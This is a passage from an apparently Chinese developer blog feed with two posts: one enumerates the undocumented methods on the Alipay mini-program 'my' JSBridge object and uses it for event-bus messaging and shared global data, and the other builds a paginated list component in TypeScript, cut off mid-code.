        <content type="html"><![CDATA[<p>支付宝小程序开发中我们使用的 <code>my</code> 其实就是 jsbrige 注入的一个对象。<br>JSBridge，简单来说就是web和native之间的桥梁,有了它你就可以在web页面中唤起native应用提供的能力。例如：唤起相册，获取应用登陆用户信息等等。</p><p>在支付宝小程序中，’my’ 这个对象可读可写。</p><pre class=" language-js"><code class="language-js">my<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>my<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1</span></code></pre><h2 id="遍历-my-对象"><a href="#遍历-my-对象" class="headerlink" title="遍历 my 对象"></a>遍历 my 对象</h2><pre class=" language-js"><code class="language-js"> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>my<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>key <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-js"><code class="language-js">isIDE on off emit callSync call reLaunch navigateTo switchTab redirectTo navigateBack postMessage createAnimation pageScrollTo loadPlugin SDKVersion ExtSDKVersion getExtConfigSync getAppIdSync getExtConfig canIUse onAppShow offAppShow onAppHide offAppHide getLaunchOptionsSync onError offError onUnhandledRejection offUnhandledRejection env createWorker connectSocket downloadFile uploadFile request uploadFileToAliCloud createInnerAudioContext getBackgroundAudioManager createAudioContext reportAnalytics reportCustomEvent getChinfoChain appendChinfoChain createSelectorQuery navigateToMiniService navigateBackFromMiniService startMiniService setOptionMenu getOpenUserInfo getPhoneNumber getIDNumber getRecorderManager getUpdateManager getFileSystemManager createIntersectionObserver _fireIntersectionObserver loadFontFace createRDSContext stopPullDownRefresh hideKeyboard __reportFrameworkPerf reportCustomError saveSnapshot saveTemplateSnapshot showSharePanel hideDebugVersion getSelectedTextRange canvasToTempFilePath preloadCanvasImage createCanvasContext _createCanvas _createOffscreenCanvas createWebViewContext createAICameraContext createARContext createCameraContext createLivePlayerContext createLivePusherContext createLottieContext createMapContext createVideoContext rpc ocr ap startRecord stopRecord cancelRecord playVoice pauseVoice resumeVoice stopVoice playBackgroundAudio pauseBackgroundAudio stopBackgroundAudio seekBackgroundAudio getBackgroundAudioPlayerState onBackgroundAudioPlay offBackgroundAudioPlay onBackgroundAudioPause offBackgroundAudioPause onBackgroundAudioStop offBackgroundAudioStop getAvailableAudioSources openBluetoothAdapter closeBluetoothAdapter getBluetoothAdapterState startBluetoothDevicesDiscovery stopBluetoothDevicesDiscovery getBluetoothDevices getConnectedBluetoothDevices connectBLEDevice disconnectBLEDevice writeBLECharacteristicValue readBLECharacteristicValue notifyBLECharacteristicValueChange getBLEDeviceServices getBLEDeviceCharacteristics onBLECharacteristicValueChange offBLECharacteristicValueChange onBLEConnectionStateChanged offBLEConnectionStateChanged onBluetoothDeviceFound offBluetoothDeviceFound startBeaconDiscovery stopBeaconDiscovery getBeacons onBeaconUpdate offBeaconUpdate onBeaconServiceChange offBeaconServiceChange openBLEPeripheral closeBLEPeripheral addPeripheralService removePeripheralService updateCharacteristic startBLEAdvertising stopBLEAdvertising onBluetoothAdapterStateChange offBluetoothAdapterStateChange onCharacteristicRead offCharacteristicRead onCharacteristicWrite offCharacteristicWrite onCharacteristicDidSubscribe offCharacteristicDidSubscribe onCharacteristicDidUnsubscribe offCharacteristicDidUnsubscribe addPhoneContact getSystemInfoSync onGyroscopeChange offGyroscopeChange onAccelerometerChange offAccelerometerChange onCompassChange offCompassChange getServerTime makePhoneCall vibrate watchShake rsa sendSMS setKeepScreenOn setClipboard getClipboard scan getSystemInfo setScreenBrightness getScreenBrightness startWifi stopWifi connectWifi getWifiList setWifiList getConnectedWifi onGetWifiList offGetWifiList onWifiConnected offWifiConnected onMemoryWarning offMemoryWarning vibrateLong vibrateShort getHCEState startHCE stopHCE onHCEMessage offHCEMessage sendHCEMessage getBatteryInfo getBatteryInfoSync onDeviceMotionChange offDeviceMotionChange getDeviceInfo registerSSID unregisterSSID getCarrierName isSystemRoot setScreenOrientation getScreenOrientation getDeviceID exit seNFCServiceIsv addEventCal addEventCalendar onLowPowerWarning offLowPowerWarning isLowPowerMode getLocation openLocation chooseLocation reGeoCode geoCode onContinuousLocation offContinuousLocation startContinuousLocation stopContinuousLocation calculateRoute compressImage previewImage chooseFileFromDisk chooseImage chooseVideo saveImage getImageInfo saveVideoToPhotosAlbum generateImageFromCode saveImageToPhotosAlbum textToSpeech onAudioInterruptionBegin onAudioInterruptionEnd offAudioInterruptionBegin offAudioInterruptionEnd httpRequest sendSocketMessage closeSocket onSocketOpen offSocketOpen onSocketMessage offSocketMessage onSocketError offSocketError onSocketClose offSocketClose getNetworkType onNetworkStatusChange offNetworkStatusChange sendMtop getTBCode setTBSessionInfo getTBSessionInfo openRpc tradePay getUserInfo getAuthCode authorize getAuthUserInfo ARScan addCardAuth openSetting getSetting openCustomerService getConfigService getOpenUserData openOtherApplication donateInBrowser getStorageInfo getStorageInfoSync setStorage setStorageSync getStorage getStorageSync clearStorage clearStorageSync removeStorage removeStorageSync showAuthGuide getAuthStatus alert confirm prompt showToast hideToast showLoading hideLoading showNavigationBarLoading hideNavigationBarLoading setNavigationBar showActionSheet choosePhoneContact chooseAlipayContact datePicker chooseCity multiLevelSelect optionsSelect chooseContact hideShareMenu startPullDownRefresh setTransparentTitle showBackToHomepage setViewTop setCanPullDown setBackgroundImage removeBackgroundImage setBackgroundColor setBackgroundTextStyle setBackButton setLocatedCity onLocatedComplete setTabBarBadge removeTabBarBadge showTabBarRedDot hideTabBarRedDot setTabBarStyle setTabBarItem showTabBar hideTabBar getTitleColor regionPicker getMenuButtonBoundingClientRect onUserCaptureScreen offUserCaptureScreen onTitleCloseClick offTitleCloseClick onTitleMoreClick offTitleMoreClick iotCreateService iotCheckService saveFile removeSavedFile getSavedFileInfo getSavedFileList getFileInfo openDocument openTaobao reportBizReady getVisitToken navigateToCouponDetail openCardList openVoucherList openTicketList openCardDetail openVoucherDetail openTicketDetail openMerchantCardList openMerchantVoucherList openMerchantTicketList openKBVoucherDetail paySignCenter zmCreditBorrow textRiskIdentification openCarService openChatWindow __openLifePayment chooseAddress getAddress startZMCreditRent zmRentTransition chooseInvoiceTitle zmFreeDeposit hideAddToDesktopMenu hideAllAddToDesktopMenu hideFavoriteMenu hideAllFavoriteMenu setCustomPopMenu getRunScene navigateToMiniProgram navigateBackMiniProgram isCollected isFavorite addToFavorite removeFromFavorite onFavorite offFavorite onInternalFavorite offInternalFavorite canFavorite hideBackHome getRunData isSpeechRecognizeAvailable startSpeechRecognize stopSpeechRecognize onSpeechRecognizeResult offSpeechRecognizeResult onSpeechRecognizeError offSpeechRecognizeError startZMVerify startAPVerify createRtcRoomContext getExtConfig </code></pre><p>所有在 my 这个对象上面挂载的方法都在这里了，比文档里面的要多得多。</p><pre class=" language-js"><code class="language-js">on off emit</code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// A 页面</span>my<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 被触发,回调被执行，打印出 {a:1}</span><span class="token comment" spellcheck="true">// B 页面</span>my<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>这三个函数明显是事件总线的实现机制，经过测试完全可用（未测试低版本基础库） <del>~</del></p><h2 id="通过-my-实现全局数据共享"><a href="#通过-my-实现全局数据共享" class="headerlink" title="通过 my 实现全局数据共享"></a>通过 my 实现全局数据共享</h2><p>一般小程序里面全局数据我们使用 globalData 处理，它本质上也只是一个全局对象。my 的性质和他类似，我们甚至可以修改 my 本身的数据，实现全局的页面数据共享</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// A 页面</span>my<span class="token punctuation">.</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">// B 页面</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>my<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1</span></code></pre><p>完全没问题，这还是引用类型数据，如果修改就直接修改啦，不需要获取上一个页面的实例，然后再去写一大摞代码~<br>eg:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> pages <span class="token operator">=</span> <span class="token function">getCurrentPages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> lastPage <span class="token operator">=</span> pages<span class="token punctuation">[</span>pages<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>lastPage<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>一对比，明显优雅太多太多了。</p><h2 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h2><p>本篇博客的一些技法，都不是常规业务实现办法，责任自负。<br>小程序的这些非公共方法，在使用的时候，最好能做一层 polyfill，防止某些环境某些方法不存在。</p><p>参考资料：</p><ul><li><a href="https://doingsth.github.io/yongqiang.shen/js/wxapp/" target="_blank" rel="noopener">教你做一个小程序框架 - yongqiang.shen</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封装小程序分页组件 waterflow-list</title>
      <link href="/2021/04/18/front-end/mini-waterflow-list/"/>
      <url>/2021/04/18/front-end/mini-waterflow-list/</url>
      
        <content type="html"><![CDATA[<p>小程序开发中，列表分页组件是比较常见的需求，每次都要写 totalNum、pageSize、loading 状态等，写得多了，始终觉得很麻烦，萌生了封装一个容器组件的念头。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ol><li>封装列表分页组件，包含加载状态</li><li>尽量少的暴露接口，减少可配置项</li><li>接口尽量少的同时，提供必要的数据重置方式，方便用户使用时候，稀奇古怪的需求</li></ol><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://opendocs.alipay.com/mini/framework/component-ref" target="_blank" rel="noopener">ref 获取组件实例 - 支付宝开放平台</a><br>和vue中概念基本一致，可以通过 ref 获取实例的属性，从而修改组件数据的状态。</p><h3 id="slot"><a href="#slot" class="headerlink" title="slot"></a>slot</h3><p><a href="https://opendocs.alipay.com/mini/framework/component-template" target="_blank" rel="noopener">组件模板和样式 - 支付宝开放平台</a><br>一般 slot 我们只是使用插入数据，很少通过 slot 获取内部数据。在支付宝小程序中可以通过作用域插槽 slot-scope ，实现外部对内部的数据访问。</p><h2 id="组件实现"><a href="#组件实现" class="headerlink" title="组件实现"></a>组件实现</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{list}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>empty<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{init &amp;&amp; !totalNum}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">></span></span>暂无数据<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{init &amp;&amp; !finished}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>加载中...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>slot</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>finished<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ totalNum &amp;&amp; finished}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>finished<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>line<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>没有更多了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>line<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>slot</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre><pre class=" language-ts"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'herbjs'</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IComponentData</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IComponentProps</span> <span class="token punctuation">{</span>  <span class="token function">onGetData</span><span class="token punctuation">(</span>currentPage<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> pageSize<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>  pageSize<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IComponentMethods</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IData</span> <span class="token punctuation">{</span>  list<span class="token punctuation">:</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span><span class="token keyword">any</span><span class="token operator">></span><span class="token punctuation">;</span>  totalNum<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * Generics * @example *    Component&lt;Data, Props, Methods, PageStore, AppStore> */</span>Component<span class="token operator">&lt;</span>IComponentData<span class="token punctuation">,</span> IComponentProps<span class="token punctuation">,</span> IComponentMethods<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span>    list<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    currentPage<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 现在页面</span>    totalNum<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 总条数</span>    totalPage<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 总页数</span>    init<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>    finished<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>    loadingFlag<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  props<span class="token punctuation">:</span> <span class="token punctuation">{</span>    onGetData<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    pageSize<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">didMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">didUnmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> <span class="token punctuation">{</span> currentPage<span class="token punctuation">,</span> finished<span class="token punctuation">,</span> loadingFlag <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>finished <span class="token operator">||</span> loadingFlag<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        loadingFlag<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onGetData</span><span class="token punctuation">(</span><span class="token operator">++</span>currentPage<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>pageSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">:</span> IData<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> totalPage <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>totalNum <span class="token operator">/</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>pageSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>currentPage <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            currentPage<span class="token punctuation">,</span>            list<span class="token punctuation">:</span> res<span class="token punctuation">.</span>list<span class="token punctuation">,</span>            init<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>            totalPage<span class="token punctuation">,</span>            totalNum<span class="token punctuation">:</span> res<span class="token punctuation">.</span>totalNum<span class="token punctuation">,</span>            loadingFlag<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>            finished<span class="token punctuation">:</span>              totalPage <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>totalPage <span class="token operator">&amp;&amp;</span> currentPage <span class="token operator">===</span> totalPage<span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            loadingFlag<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>            currentPage<span class="token punctuation">,</span>            finished<span class="token punctuation">:</span> totalPage <span class="token operator">&amp;&amp;</span> currentPage <span class="token operator">===</span> totalPage<span class="token punctuation">,</span>            list<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>list<span class="token punctuation">,</span> <span class="token operator">...</span>res<span class="token punctuation">.</span>list<span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>对外部暴露的接口</p><table><thead><tr><th>接口</th><th>作用</th></tr></thead><tbody><tr><td>slot name:item list</td><td>需要循环的 list 数据</td></tr><tr><td>slot name:loading</td><td>修改loading样式</td></tr><tr><td>slot name:finished</td><td>修改 finished 样式</td></tr><tr><td>props onGetData</td><td>获取外部数据</td></tr><tr><td>props pageSize</td><td>获取分页大小，默认 20</td></tr><tr><td>Methods getData</td><td>调用获取外部数据</td></tr></tbody></table><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>waterflow-list</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>saveComponentLoadData<span class="token punctuation">'</span></span> <span class="token attr-name">onGetData</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getListData<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span> <span class="token attr-name">slot-scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>props<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>block</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{props.list}}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">></span></span>{{item.num}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>block</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>waterflow-list</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre><pre class=" language-ts"><code class="language-ts">Page<span class="token operator">&lt;</span>IPageState<span class="token punctuation">,</span> IPageMethods<span class="token punctuation">,</span> IPageStore<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token function">onLoad</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">onReady</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">onShow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">onHide</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">onUnload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'beforeRender'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 保存 ref</span>  <span class="token function">saveComponentLoadData</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>loadDataComponent <span class="token operator">=</span> ref<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 获取数据</span>  <span class="token function">getListData</span><span class="token punctuation">(</span>currentPage<span class="token punctuation">,</span> pageSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      list<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> num<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> num<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> num<span class="token punctuation">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      totalNum<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 手动触发获取数据</span>  <span class="token function">addData</span><span class="token 